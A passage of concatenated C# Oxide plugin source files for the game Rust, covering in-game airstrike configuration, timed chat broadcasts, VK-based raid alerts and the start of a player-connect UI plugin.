                case StrikeType.Nuke:
                    CallNuke(position, string.Empty);
                    SendReply(arg, string.Format("Nuke strike confirmed at co-ordinates: {0}", position));
                    break;
                case StrikeType.Spectre:
                    CallSpectre(position, string.Empty);
                    SendReply(arg, string.Format("Spectre strike confirmed at co-ordinates: {0}", position));
                    break;
                default: return;
            }
        }
        #endregion

        #region Config 
        private ConfigData configData;
        class RocketOptions
        {
            [JsonProperty(PropertyName = "Speed of the rocket")]
            public float Speed { get; set; }
            [JsonProperty(PropertyName = "Damage modifier")]
            public float Damage { get; set; }
            [JsonProperty(PropertyName = "Accuracy of rocket (a lower number is more accurate)")]
            public float Accuracy { get; set; }
            [JsonProperty(PropertyName = "Accuracy of spectre rocket (a lower number is more accurate)")]
            public float SpectreAccuracy { get; set; }
            [JsonProperty(PropertyName = "Interval between rockets (seconds)")]
            public float Interval { get; set; }
            [JsonProperty(PropertyName = "Interval between rockets (seconds) (Spectre Strike)")]
            public float IntervalSpectre { get; set; }
            [JsonProperty(PropertyName = "Type of rocket (Normal, Napalm)")]
            public string Type { get; set; }
            [JsonProperty(PropertyName = "Use both rocket types")]
            public bool Mixed { get; set; }
            [JsonProperty(PropertyName = "Chance of a fire rocket (when using both types)")]
            public int FireChance { get; set; }
            [JsonProperty(PropertyName = "Amount of rockets to fire")]
            public int Amount { get; set; }
            [JsonProperty(PropertyName = "Napalm lifetime (seconds) (Napalm Strike)")]
            public float FireLife { get; set; }
            [JsonProperty(PropertyName = "Radiation lifetime (seconds) (Nuke Strike)")]
            public float RadDuration { get; set; }
            [JsonProperty(PropertyName = "Radiation intensity (Nuke Strike)")]
            public float RadIntensity { get; set; }
            [JsonProperty(PropertyName = "Radiation radius (Nuke Strike)")]
            public float RadRadius { get; set; }
            [JsonProperty(PropertyName = "Damage radius (Nuke Strike)")]
            public float NukeRadius { get; set; }           
            [JsonProperty(PropertyName = "Damage amount (Nuke Strike)")]
            public float NukeAmount { get; set; }
        }
        class CannonOptions
        {            
            [JsonProperty(PropertyName = "Damage modifier")]
            public float Damage { get; set; }
            [JsonProperty(PropertyName = "Accuracy of shell (a lower number is more accurate)")]
            public float Accuracy { get; set; }
            [JsonProperty(PropertyName = "Accuracy of spectre shells (a lower number is more accurate)")]
            public float SpectreAccuracy { get; set; }
            [JsonProperty(PropertyName = "Interval between shells (seconds)")]
            public float Interval { get; set; }
            [JsonProperty(PropertyName = "Interval between shells (seconds) (Spectre Strike)")]
            public float IntervalSpectre { get; set; }       
            [JsonProperty(PropertyName = "Amount of shells to fire")]
            public int Amount { get; set; }           
        }
        class GunOptions
        {
            [JsonProperty(PropertyName = "Amount to fire")]
            public int Amount { get; set; }
            [JsonProperty(PropertyName = "Bullet fire rate")]
            public float FireRate { get; set; }
            [JsonProperty(PropertyName = "Is explosive ammunition")]
            public bool IsExplosive { get; set; }
            [JsonProperty(PropertyName = "Accuracy of bullet spread")]
            public float Accuracy { get; set; }
            [JsonProperty(PropertyName = "Damage of bullets")]
            public float Damage { get; set; }
        }
        class CooldownOptions
        {
            [JsonProperty(PropertyName = "Use cooldown timers")]
            public bool Enabled { get; set; }
            [JsonProperty(PropertyName = "Use a global cooldown for each type")]
            public bool Combine { get; set; }
            [JsonProperty(PropertyName = "Global cooldown time")]
            public int Time { get; set; }
            [JsonProperty(PropertyName = "Cooldown time that commands can be used on other players")]
            public int PlayerTime { get; set; }
            [JsonProperty(PropertyName = "Strike cooldown times (seconds)")]
            public Dictionary<string, int> Times { get; set; }            
        }
        class PlaneOptions
        {
            [JsonProperty(PropertyName = "Flight speed (meters per second)")]
            public float Speed { get; set; }
            [JsonProperty(PropertyName = "Distance from target to engage")]
            public float Distance { get; set; }
            [JsonProperty(PropertyName = "Flight radius (Spectre Strike)")]
            public float FlightRadius { get; set; }
        }
        class BuyOptions
        {
            [JsonProperty(PropertyName = "Can purchase standard strike")]
            public bool StrikeEnabled { get; set; }
            [JsonProperty(PropertyName = "Can purchase squad strike")]
            public bool SquadEnabled { get; set; }
            [JsonProperty(PropertyName = "Can purchase napalm strike")]
            public bool NapalmEnabled { get; set; }
            [JsonProperty(PropertyName = "Can purchase nuke strike")]
            public bool NukeEnabled { get; set; }
            [JsonProperty(PropertyName = "Can purchase spectre strike")]
            public bool SpectreEnabled { get; set; }

            [JsonProperty(PropertyName = "Require permission to purchase strike")]
            public bool PermissionStrike { get; set; }
            [JsonProperty(PropertyName = "Require permission to purchase squad strike")]
            public bool PermissionSquad { get; set; }
            [JsonProperty(PropertyName = "Require permission to purchase napalm strike")]
            public bool PermissionNapalm { get; set; }
            [JsonProperty(PropertyName = "Require permission to purchase nuke strike")]
            public bool PermissionNuke { get; set; }
            [JsonProperty(PropertyName = "Require permission to purchase spectre strike")]
            public bool PermissionSpectre { get; set; }

            [JsonProperty(PropertyName = "Cost to purchase a standard strike (shortname, amount)")]
            public Dictionary<string, int> StrikeCost { get; set; }
            [JsonProperty(PropertyName = "Cost to purchase a squad strike (shortname, amount)")]
            public Dictionary<string, int> SquadCost { get; set; }
            [JsonProperty(PropertyName = "Cost to purchase a napalm strike (shortname, amount)")]
            public Dictionary<string, int> NapalmCost { get; set; }
            [JsonProperty(PropertyName = "Cost to purchase a nuke strike (shortname, amount)")]
            public Dictionary<string, int> NukeCost { get; set; }
            [JsonProperty(PropertyName = "Cost to purchase a spectre strike (shortname, amount)")]
            public Dictionary<string, int> SpectreCost { get; set; }
        }
        class OtherOptions
        {
            [JsonProperty(PropertyName = "Allow players to call strikes using co-ordinates")]
            public bool AllowCoords { get; set; }

            [JsonProperty(PropertyName = "Broadcast strikes to chat")]
            public bool Broadcast { get; set; }
            [JsonProperty(PropertyName = "Broadcast player names when a strike is called")]
            public bool BroadcastNames { get; set; }

            [JsonProperty(PropertyName = "Can call standard strikes using a supply signal")]
            public bool SignalStrike { get; set; }
            [JsonProperty(PropertyName = "Can call squad strikes using a supply signal")]
            public bool SignalSquad { get; set; }
            [JsonProperty(PropertyName = "Can call napalm strikes using a supply signal")]
            public bool SignalNapalm { get; set; }
            [JsonProperty(PropertyName = "Can call nuke strikes using a supply signal")]
            public bool SignalNuke { get; set; }
            [JsonProperty(PropertyName = "Can call spectre strikes using a supply signal")]
            public bool SignalSpectre { get; set; }

            [JsonProperty(PropertyName = "Random airstrike locations (Spawnfile name)")]
            public string RandomStrikeLocations { get; set; }

            [JsonProperty(PropertyName = "Random airstrike types (Strike, Squad, Napalm, Nuke, Spectre)")]
            public List<string> RandomStrikes { get; set; }  

            [JsonProperty(PropertyName = "Random timer (minimum, maximum. In seconds)")]
            public int[] RandomTimer { get; set; }

            [JsonProperty(PropertyName = "NoEscape - Prevent strikes against RaidBlocked players")]
            public bool AgainstRB { get; set; }
            [JsonProperty(PropertyName = "NoEscape - Prevent strikes from RaidBlocked players")]
            public bool FromRB { get; set; }
            [JsonProperty(PropertyName = "NoEscape - Prevent strikes against CombatBlocked players")]
            public bool AgainstCB { get; set; }
            [JsonProperty(PropertyName = "NoEscape - Prevent strikes from CombatBlocked players")]
            public bool FromCB { get; set; }
        }
        class ConfigData
        {
            [JsonProperty(PropertyName = "Strike Weapon Types (Rocket, Bullet, Cannon, Combined)")]
            public Dictionary<StrikeType, string> Types { get; set; }
            [JsonProperty(PropertyName = "Rocket Options")]
            public RocketOptions Rocket { get; set; }
            [JsonProperty(PropertyName = "Cannon Options")]
            public CannonOptions Cannon { get; set; }
            [JsonProperty(PropertyName = "Strike Gun Options")]
            public Dictionary<StrikeType, GunOptions> Gun { get; set; }
            [JsonProperty(PropertyName = "Cooldown Options")]
            public CooldownOptions Cooldown { get; set; }
            [JsonProperty(PropertyName = "Plane Options")]
            public PlaneOptions Plane { get; set; }
            [JsonProperty(PropertyName = "Purchase Options")]
            public BuyOptions Buy { get; set; }
            [JsonProperty(PropertyName = "Other Options")]
            public OtherOptions Other { get; set; }
            public Oxide.Core.VersionNumber Version { get; set; }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            configData = Config.ReadObject<ConfigData>();

            if (configData.Version < Version)
                UpdateConfigValues();

            Config.WriteObject(configData, true);
        }

        protected override void LoadDefaultConfig() => configData = GetBaseConfig();

        private ConfigData GetBaseConfig()
        {
            return new ConfigData
            {
                Buy = new BuyOptions
                {
                    SquadCost = new Dictionary<string, int>
                    {
                        ["metal.refined"] = 100,
                        ["techparts"] = 50,
                        ["targeting.computer"] = 1
                    },
                    SquadEnabled = true,
                    PermissionSquad = true,
                    StrikeCost = new Dictionary<string, int>
                    {
                        ["metal.refined"] = 50,
                        ["targeting.computer"] = 1
                    },
                    StrikeEnabled = true,
                    PermissionStrike = true,
                    SpectreCost = new Dictionary<string, int>
                    {
                        ["metal.refined"] = 150,
                        ["techparts"] = 100,
                        ["targeting.computer"] = 2
                    },
                    SpectreEnabled = true,
                    PermissionSpectre = true,
                    NapalmCost = new Dictionary<string, int>
                    {
                        ["lowgradefuel"] = 500,
                        ["metal.refined"] = 100,
                        ["targeting.computer"] = 1
                    },
                    NapalmEnabled = true,
                    PermissionNapalm = true,
                    NukeCost = new Dictionary<string, int>
                    {
                        ["explosives"] = 20,
                        ["metal.refined"] = 200,
                        ["targeting.computer"] = 2
                    },
                    NukeEnabled = true,
                    PermissionNuke = true
                },
                Cooldown = new CooldownOptions
                {
                    Combine = false,
                    Enabled = true,
                    Time = 3600,
                    Times = new Dictionary<string, int>
                    {
                        [StrikeType.Strike.ToString()] = 3600,
                        [StrikeType.Squad.ToString()] = 3600,
                        [StrikeType.Napalm.ToString()] = 3600,
                        [StrikeType.Nuke.ToString()] = 3600,
                        [StrikeType.Spectre.ToString()] = 3600
                    },
                    PlayerTime = 600
                },
                Other = new OtherOptions
                {
                    AllowCoords = true,
                    Broadcast = true,
                    BroadcastNames = false,
                    SignalSquad = true,
                    SignalStrike = true,
                    SignalNapalm = true,
                    SignalNuke = true,
                    SignalSpectre = true,
                    RandomStrikes = new List<string>() { StrikeType.Strike.ToString(), StrikeType.Squad.ToString(), StrikeType.Napalm.ToString(), StrikeType.Nuke.ToString(), StrikeType.Spectre.ToString() },
                    RandomStrikeLocations = string.Empty,
                    RandomTimer = new int[] { 1800, 3600 },
                    AgainstCB = false,
                    AgainstRB = false,
                    FromCB = false,
                    FromRB = false
                },
                Plane = new PlaneOptions
                {
                    Distance = 900,
                    Speed = 105,
                    FlightRadius = 300
                },
                Rocket = new RocketOptions
                {
                    Accuracy = 1.5f,
                    Amount = 15,
                    Damage = 1.0f,
                    FireChance = 4,
                    Interval = 0.6f,
                    Mixed = true,
                    Speed = 110f,
                    Type = "Normal",
                    FireLife = 60f,
                    IntervalSpectre = 1.5f,
                    NukeAmount = 100,
                    NukeRadius = 20,
                    SpectreAccuracy = 7f,
                    RadDuration = 30,
                    RadIntensity = 30,
                    RadRadius = 30
                },
                Cannon = new CannonOptions
                {
                    Accuracy = 1.5f,
                    Amount = 15,
                    Damage = 1.0f,
                    Interval = 0.6f,
                    IntervalSpectre = 1.5f,
                    SpectreAccuracy = 7f
                },
                Types = new Dictionary<StrikeType, string>
                {
                    [StrikeType.Strike] = FireType.Bullet.ToString(),
                    [StrikeType.Squad] = FireType.Rocket.ToString(),
                    [StrikeType.Spectre] = FireType.Combined.ToString()
                },
                Gun = new Dictionary<StrikeType, GunOptions>
                {
                    [StrikeType.Strike] = new GunOptions
                    {
                        Accuracy = 15f,
                        Amount = 100,
                        Damage = 15f,
                        FireRate = 0.07f,
                        IsExplosive = false
                    },
                    [StrikeType.Squad] = new GunOptions
                    {
                        Accuracy = 15f,
                        Amount = 50,
                        Damage = 15f,
                        FireRate = 0.2f,
                        IsExplosive = true
                    },
                    [StrikeType.Spectre] = new GunOptions
                    {
                        Accuracy = 15f,
                        Amount = 300,
                        Damage = 15f,
                        FireRate = 0.115f,
                        IsExplosive = true
                    },
                },
                Version = Version
            };
        }

        protected override void SaveConfig() => Config.WriteObject(configData, true);

        private void UpdateConfigValues()
        {
            PrintWarning("Config update detected! Updating config values...");

            ConfigData baseConfig = GetBaseConfig();

            if (configData.Version < new VersionNumber(0, 1, 55))
                configData.Types = baseConfig.Types;

            if (configData.Version < new VersionNumber(0, 1, 60))
                configData.Cannon = baseConfig.Cannon;

            if (configData.Version < new VersionNumber(0, 1, 65))
                configData.Cooldown.PlayerTime = baseConfig.Cooldown.PlayerTime;

            if (configData.Version < new VersionNumber(0, 1, 70))
                configData.Other.BroadcastNames = baseConfig.Other.BroadcastNames;

            if (configData.Version < new VersionNumber(0, 1, 73))
            {
                configData.Other.AllowCoords = true;
                configData.Other.AgainstCB = false;
                configData.Other.AgainstRB = false;
                configData.Other.FromCB = false;
                configData.Other.FromRB = false;
            }

            configData.Version = Version;
            PrintWarning("Config update completed!");
        }        
        #endregion

        #region Data Management
        private void SaveData() => data.WriteObject(storedData);

        private void LoadData()
        {
            try
            {
                storedData = data.ReadObject<StoredData>();
            }
            catch
            {
                storedData = new StoredData();
            }

            if (storedData.cooldowns == null)
                storedData.cooldowns = new Dictionary<ulong, CooldownData>();
        }

        private void ClearData()
        {
            storedData = new StoredData();
            SaveData();
        }

        private class StoredData
        {
            public Dictionary<ulong, CooldownData> cooldowns = new Dictionary<ulong, CooldownData>();
        }

        private class CooldownData
        {
            public double strikeCd, squadCd, napalmCd, nukeCd, spectreCd, globalCd;
        }
        #endregion

        #region Localization
        private string msg(string key, string playerId = null) => lang.GetMessage(key, this, playerId);

        Dictionary<string, string> Messages = new Dictionary<string, string>
        {
            ["strikeConfirmed"] = "<color=#939393>Airstrike confirmed at co-ordinates: </color><color=#ce422b>{0}</color>",
            ["squadConfirmed"] = "<color=#939393>Squadstrike confirmed at co-ordinates: </color><color=#ce422b>{0}</color>",
            ["napalmConfirmed"] = "<color=#939393>Napalm strike confirmed at co-ordinates: </color><color=#ce422b>{0}</color>",
            ["nukeConfirmed"] = "<color=#939393>Nuke strike confirmed at co-ordinates: </color><color=#ce422b>{0}</color>",
            ["spectreConfirmed"] = "<color=#939393>Spectre strike confirmed at co-ordinates: </color><color=#ce422b>{0}</color>",
            ["strikePlayer"] = "<color=#939393>Airstrike confirmed at <color=#ce422b>{0}</color>'s co-ordinates</color>",
            ["squadPlayer"] = "<color=#939393>Squadstrike confirmed at <color=#ce422b>{0}</color>'s co-ordinates</color>",
            ["napalmPlayer"] = "<color=#939393>Napalm strike confirmed at <color=#ce422b>{0}</color>'s co-ordinates</color>",
            ["nukePlayer"] = "<color=#939393>Nuke strike confirmed at <color=#ce422b>{0}</color>'s co-ordinates</color>",
            ["spectrePlayer"] = "<color=#939393>Spectre strike confirmed at <color=#ce422b>{0}</color>'s co-ordinates</color>",
            ["strikeInbound"] = "<color=#ce422b>Air strike inbound!</color>",
            ["squadInbound"] = "<color=#ce422b>Squad strike inbound!</color>",
            ["napalmInbound"] = "<color=#ce422b>Napalm strike inbound!</color>",
            ["nukeInbound"] = "<color=#ce422b>Nuke strike inbound!</color>",
            ["spectreInbound"] = "<color=#ce422b>Spectre strike inbound!</color>",
            ["strikeInboundName"] = "<color=#ce422b>{0} called a air strike!</color>",
            ["squadInboundName"] = "<color=#ce422b>{0} called a squad strike!</color>",
            ["napalmInboundName"] = "<color=#ce422b>{0} called a napalm strike!</color>",
            ["nukeInboundName"] = "<color=#ce422b>{0} called a nuke strike!</color>",
            ["spectreInboundName"] = "<color=#ce422b>{0} called a spectre strike!</color>",
            ["buyItem"] = "<color=#939393>You need another </color><color=#ce422b>{0} {1}</color><color=#939393> to buy this strike</color>",
            ["help1"] = "<color=#ce422b>/strike signal <strike|squad|napalm|nuke|spectre></color><color=#939393> - Use a supply signal to mark a airstrike position</color>",
            ["help2"] = "<color=#ce422b>/strike buy <strike|squad|napalm|nuke|spectre></color><color=#939393> - Purchase a airstrike on your position</color>",
            ["help6"] = "<color=#ce422b>/strike buy <strike|squad|napalm|nuke|spectre> \"player name\"</color><color=#939393> - Purchase a airstrike on the target player</color>",
            ["help7"] = "<color=#ce422b>/strike buy <strike|squad|napalm|nuke|spectre> \"x\" \"z\"</color><color=#939393> - Purchase a airstrike on your position</color>",
            ["help3"] = "<color=#ce422b>/strike call <strike|squad|napalm|nuke|spectre></color><color=#939393> - Call a airstrike on target position</color>",
            ["help4"] = "<color=#ce422b>/strike call <strike|squad|napalm|nuke|spectre> \"player name\" </color><color=#939393>- Call a airstrike to the target player</color>",
            ["help5"] = "<color=#ce422b>/strike call <strike|squad|napalm|nuke|spectre> \"x\" \"z\" </color><color=#939393>- Call a airstrike to the target position</color>",
            ["onCooldown"] = "<color=#939393>You must wait another </color><color=#ce422b>{0}</color><color=#939393> before calling this type again</color>",
            ["noPerms"] = "<color=#939393>You do not have permission to use that strike type</color>",
            ["signalReady"] = "<color=#939393>Throw a supply signal to call a strike</color>",
            ["typeDisabledSignal"] = "<color=#939393>That strike type can not be called with supply signals</color>",
            ["typeDisabledBuy"] = "<color=#939393>That strike type can not be purchased</color>",
            ["invCoords"] = "<color=#939393>Invalid co-ordinates set. You must enter number values for X and Z</color>",
            ["multiplePlayers"] = "<color=#939393>Multiple players found</color>",
            ["noPlayers"] = "<color=#939393>No players found</color>",
            ["invalidType"] = "<color=#939393>Invalid strike type selected</color>",
            ["invalidSyntax"] = "<color=#939393>Invalid command syntax!</color>",
            ["playerCooldown"] = "<color=#939393>The specified player had a strike launched at them recently. Try again later!</color>",
            ["playerRaidBlocked"] = "<color=#939393>You can not call a strike when you are <color=#ce422b>Raid Blocked</color></color>",
            ["playerCombatBlocked"] = "<color=#939393>You can not call a strike when you are <color=#ce422b>Combat Blocked</color></color>",
            ["targetRaidBlocked"] = "<color=#939393>You can not call a strike on a <color=#ce422b>Raid Blocked</color> player</color>",
            ["targetCombatBlocked"] = "<color=#939393>You can not call a strike on a <color=#ce422b>Combat Blocked</color> player</color>",
        };
        #endregion
    }
}


// --- End of file: AdvAirstrike.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/XChatMessage.cs ---
// --- Original Local Path: XChatMessage.cs ---

using System.Collections.Generic;
using Newtonsoft.Json; 

namespace Oxide.Plugins 
{ 
    [Info("XChatMessage", "Sempai#3239", "1.0.0")] 
    class XChatMessage : RustPlugin 
    { 
	    public int _message;
		
		#region Configuration  
   
        private ChatMessageConfig config; 
 
        private class ChatMessageConfig
        {		  
		    internal class GeneralSetting
			{
				[JsonProperty("Интервал сообщений в чат")] public float TimeMessage;
				[JsonProperty("SteamID профиля для кастомной аватарки")] public ulong SteamID;
			}	 						
			
			[JsonProperty("Общие настройки")]
            public GeneralSetting Setting;			
			[JsonProperty("Ключи сообщений для ленгов")]
            public List<string> Messages;	          	
			
			public static ChatMessageConfig GetNewConfiguration()
            {
                return new ChatMessageConfig  
                {
					Setting = new GeneralSetting      
					{
						TimeMessage = 300.0f,
						SteamID = 0
					},
					Messages = new List<string>
					{
						"MESSAGE_1",
						"MESSAGE_2",
						"MESSAGE_3"
					}   
				};
			}
        }
  
        protected override void LoadConfig()
        {
            base.LoadConfig();
			
			try
			{
				config = Config.ReadObject<ChatMessageConfig>(); 
			}
			catch
			{
				PrintWarning("Ошибка чтения конфигурации! Создание дефолтной конфигурации!");
				LoadDefaultConfig();
			}
			
			SaveConfig();
        }
		protected override void LoadDefaultConfig() => config = ChatMessageConfig.GetNewConfiguration();
        protected override void SaveConfig() => Config.WriteObject(config);

        #endregion
		
		#region Hooks
		
		private void OnServerInitialized()
		{
			
			InitializeLang();
			Broadcast();
		}
		
		private void Broadcast()       
		{
			int count = config.Messages.Count;
			
			if(count == 0)
			{
				PrintWarning("У вас нет сообщений!!!");
				return;
			}
			
			foreach (BasePlayer player in BasePlayer.activePlayerList)
			    Player.Reply(player, lang.GetMessage(config.Messages[_message], this, player.UserIDString), config.Setting.SteamID); 
			
			_message++;
			if(_message >= count--)
				_message = 0;
			
			timer.Once(config.Setting.TimeMessage, Broadcast); 
		}
		
		#endregion
		
		#region Lang
 
        private void InitializeLang()
        {
			Dictionary<string, string> llang = new Dictionary<string, string>();		
				
			foreach(var message in config.Messages)
			    llang.Add(message, "MESSAGE MESSAGE MESSAGE");			
			 
            lang.RegisterMessages(llang, this);
            lang.RegisterMessages(llang, this, "ru");
        }

        #endregion
	}
}

// --- End of file: XChatMessage.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/VKRaidAlert.cs ---
// --- Original Local Path: VKRaidAlert.cs ---

using UnityEngine;
using System;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using System.Linq;
using System.Globalization;
using Oxide.Core.Configuration;

namespace Oxide.Plugins
{
    [Info("VKRaidAlert", "SkiTles", "1.1")]
    class VKRaidAlert : RustPlugin
    {
        [PluginReference]
        Plugin VKBot;
        DateTime LNT;
        class DataStorage
        {
            public Dictionary<ulong, VKRADATA> VKRaidAlertData = new Dictionary<ulong, VKRADATA>();
            public DataStorage() { }
        }
        class VKRADATA
        {
            public string LastOnlNotice;
        }
        DataStorage data;
        private DynamicConfigFile VKRData;
        void OnServerInitialized()
        {
            VKRData = Interface.Oxide.DataFileSystem.GetFile("VKRaidAlert");
            LoadData();
            if (!permission.PermissionExists(permissionvk)) permission.RegisterPermission(permissionvk, this);
            if (!permission.PermissionExists(permissionol)) permission.RegisterPermission(permissionol, this);
        }
        private string permissionvk = "vkraidalert.allow";
        private string permissionol = "vkraidalert.online";
        private int timeallowed = 30;
        private int tallowedol = 10;
        private string raidnotice = "[Оповещения о рейдах] Кажется игрок {attacker} хочет вас ограбить!";
        private bool MsgAttB = false;
        private string MsgAtt = "photo-1_265827614";
        private string raidnoticeol = "Кажется игрок {attacker} хочет вас ограбить!";
        List<string> allowedentity = new List<string>()
        {
            "door",
            "wall.window.bars.metal",
            "wall.window.bars.toptier",
            "wall.external",
            "gates.external.high",
            "floor.ladder",
            "embrasure",
            "floor.grill",
            "wall.frame.fence",
            "wall.frame.cell"
        };
        protected override void LoadDefaultConfig()
        {
            Puts("Creating a new config file");
            Config.Clear();
        }
        private void LoadConfigValues()
        {
            GetConfig("A. Привилегия для отправки оповещений оффлайн игрокам в ВК", ref permissionvk);
            GetConfig("B. Интервал оповещений оффлайн игрокам в ВК (в минутах)", ref timeallowed);
            GetConfig("C. Текст оповещения оффлайн игрокам в ВК", ref raidnotice);
            GetConfig("D. Прикрепить изображение к сообщению?", ref MsgAttB);
            GetConfig("E. Ссылка на изображение, пример: photo-1_265827614", ref MsgAtt);

            GetConfig("F. Привилегия для отправки оповещений онлайн игрокам в чат", ref permissionol);
            GetConfig("G. Интервал оповещений онлайн игрокам в чат (в минутах)", ref tallowedol);
            GetConfig("H. Текст оповещения онлайн игрокам в чат", ref raidnoticeol);
            SaveConfig();
        }
        void Loaded()
        {
            LoadConfigValues();
        }
        void OnEntityDeath(BaseCombatEntity entity, HitInfo hitInfo)
        {
            if (hitInfo == null) return;
            if (hitInfo.Initiator?.ToPlayer() == null) return;
            if (hitInfo.Initiator?.ToPlayer().userID == entity.OwnerID) return;
            if (hitInfo.damageTypes.GetMajorityDamageType() != Rust.DamageType.Explosion && hitInfo.damageTypes.GetMajorityDamageType() != Rust.DamageType.Heat && hitInfo.damageTypes.GetMajorityDamageType() != Rust.DamageType.Bullet) return;
            if (entity is BaseEntity)
            {
                BuildingBlock block = entity.GetComponent<BuildingBlock>();
                if (block != null)
                {
                    if (block.currentGrade.gradeBase.type.ToString() == "Twigs" || block.currentGrade.gradeBase.type.ToString() == "Wood")
                    {
                        return;
                    }
                }
                else
                {
                    bool ok = false;
                    foreach (var ent in allowedentity)
                    {
                        if (entity.LookupPrefab().name.Contains(ent))
                        {
                            ok = true;
                        }
                    }
                    if (!ok) return;
                }
                if (entity.OwnerID == 0) return;
                if (!IsOnline(entity.OwnerID))
                {
                    SendOfflineMessage(entity.OwnerID, hitInfo.Initiator?.ToPlayer().displayName);
                }
                else
                {
                    var victimid = OnlinePlayer(entity.OwnerID);
                    if (victimid == null) return;
                    string attackername = hitInfo.Initiator?.ToPlayer().displayName;
                    SendOnlinenotice(victimid, attackername);
                }
            }
        }
        bool IsOnline(ulong id)
        {
            foreach (BasePlayer active in BasePlayer.activePlayerList)
            {
                if (active.userID == id) return true;
            }
            return false;
        }
        BasePlayer OnlinePlayer(ulong id)
        {
            foreach (BasePlayer active in BasePlayer.activePlayerList)
            {
                if (active.userID == id) return active;
            }
            return null;
        }
        TimeSpan TimeLeft(DateTime time)
        {
            return DateTime.Now.Subtract(time);
        }
        private void SendOnlinenotice(BasePlayer victim, string raidername)
        {
            if (!permission.UserHasPermission(victim.userID.ToString(), permissionol)) return;
            if (data.VKRaidAlertData.ContainsKey(victim.userID))
            {
                if (DateTime.TryParseExact(data.VKRaidAlertData[victim.userID].LastOnlNotice, "dd.MM.yyyy HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None, out LNT))
                {
                    if (TimeLeft(LNT).TotalMinutes >= tallowedol)
                    {
                        string text = TextReplace(raidnoticeol,
                                        new KeyValuePair<string, string>("attacker", raidername));
                        PrintToChat(victim, text);
                        data.VKRaidAlertData[victim.userID].LastOnlNotice = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
                        VKRData.WriteObject(data);
                    }
                }
                else
                {
                    Log("Log", $"Ошибка обработки времени последнего оповещения игрока {victim.userID.ToString()}");
                    return;
                }
            }
            else
            {
                string text = TextReplace(raidnoticeol,
                                        new KeyValuePair<string, string>("attacker", raidername));
                PrintToChat(victim, text);
                data.VKRaidAlertData.Add(victim.userID, new VKRADATA()
                {
                    LastOnlNotice = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss")
                });
                VKRData.WriteObject(data);
            }
        }
        void SendOfflineMessage(ulong id, string raidername)
        {
            if (!permission.UserHasPermission(id.ToString(), permissionvk)) return;
            var userVK = (string)VKBot?.Call("GetUserVKId", id);
            if (userVK == null) return;
            var LastNotice = (string)VKBot?.Call("GetUserLastNotice", id);
            if (LastNotice == null)
            {
                string text = TextReplace(raidnotice,
                                            new KeyValuePair<string, string>("attacker", raidername));
                VKBot?.Call("VKAPIMsg", text, MsgAtt, userVK, MsgAttB);
                string LastRaidNotice = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
                VKBot?.Call("VKAPISaveLastNotice", id, LastRaidNotice);
            }
            else
            {
                if (DateTime.TryParseExact(LastNotice, "dd.MM.yyyy HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None, out LNT))
                {
                    if (TimeLeft(LNT).TotalMinutes >= timeallowed)
                    {
                        string text = TextReplace(raidnotice,
                            new KeyValuePair<string, string>("attacker", raidername));
                        VKBot?.Call("VKAPIMsg", text, MsgAtt, userVK, MsgAttB);
                        string LastRaidNotice = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
                        VKBot?.Call("VKAPISaveLastNotice", id, LastRaidNotice);
                    }
                }
                else
                {
                    Log("Log", $"Ошибка обработки времени последнего оповещения игрока {id}");
                    return;
                }
            }
        }
        private string TextReplace(string key, params KeyValuePair<string, string>[] replacements)
        {
            string message = key;
            foreach (var replacement in replacements)
                message = message.Replace($"{{{replacement.Key}}}", replacement.Value);
            return message;
        }
        private void GetConfig<T>(string Key, ref T var)
        {
            if (Config[Key] != null)
            {
                var = (T)Convert.ChangeType(Config[Key], typeof(T));
            }
            Config[Key] = var;
        }
        void Log(string filename, string text)
        {
            LogToFile(filename, $"[{DateTime.Now}] {text}", this);
        }
        void LoadData()
        {
            try
            {
                data = Interface.GetMod().DataFileSystem.ReadObject<DataStorage>("VKRaidAlert");
            }

            catch
            {
                data = new DataStorage();
            }
        }
    }
}

// --- End of file: VKRaidAlert.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/UIConnect.cs ---
// --- Original Local Path: UIConnect.cs ---

// UI Connect скачан с сайта Server-rust.ru Сотни новых бесплатных плагинов уже на нашем сайте! 
// Присоеденяйся к нам! Server-rust.ru
using System.Collections.Generic;
using System;
using System.Runtime.InteropServices.ComTypes;
using ConVar;
using Facepunch.Steamworks;
using JetBrains.Annotations;
using Mono.Security.X509;
using UnityEngine;
using Oxide.Plugins;
using Oxide.Game.Rust.Cui;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core;
using UnityEngine.Networking;
using Console = System.Console;

namespace Oxide.Plugins
{
	[Info("UIConnect", "A1M41K", "1.2.2")]
	class UIConnect : RustPlugin
	{
		#region Значения
		private int FontSizeText = 16;
        private string FontName = "robotocondensed-regular.ttf";
        private bool ShowGUI = false;
		private bool ShowPrefix = true;
		private bool ShowReason = true;
		private bool ShowDisconnect = true;
		private bool showconnectadmin = true;
		private string colorname = "#0081de";
		private string colorprefix = "#0081de";
		private string Prefix = "[UIConnect]";
		private string formatconnectChat = "Присоединился к игре {PLAYER}";
		private string formatLeaveChat = "Отключился от игры {PLAYER} [Причина: {0}]";
		private string formatconnectUI = "Присоединился: {Name}";
		private string AnchorMinUI = "0.01249945 0.03518518";
		private string AnchorMaxUI = "0.2447917 0.07685138";
		#endregion

		#region Hooks

				void OnPlayerInit(BasePlayer player, string[] args)
        		{	
        			timer.Once(5, () =>
        			{ 
        				foreach (var check in BasePlayer.activePlayerList)
        				updateGUI(check, player.net.connection.username);
        				timer.Once(5, () =>
        				{
        					foreach (var check in BasePlayer.activePlayerList)
        					CuiHelper.DestroyUi(check, "ConnectGUI");
        					});
        				});
			        
			        sendJoinMessage(player);
		        }
			
        		void OnServerInitialized()
        		{
        			LoadConfig();
        			LoadDefaultMessages();
        		}
		
		#endregion

		#region UI

				private void updateGUI(BasePlayer player, string Name)
        		{
        			CuiHelper.DestroyUi(player, "ConnectGUI");
        			ConnectGUI(player, Name);
        		}
        
        		private void ConnectGUI(BasePlayer player, string Name)
        		{
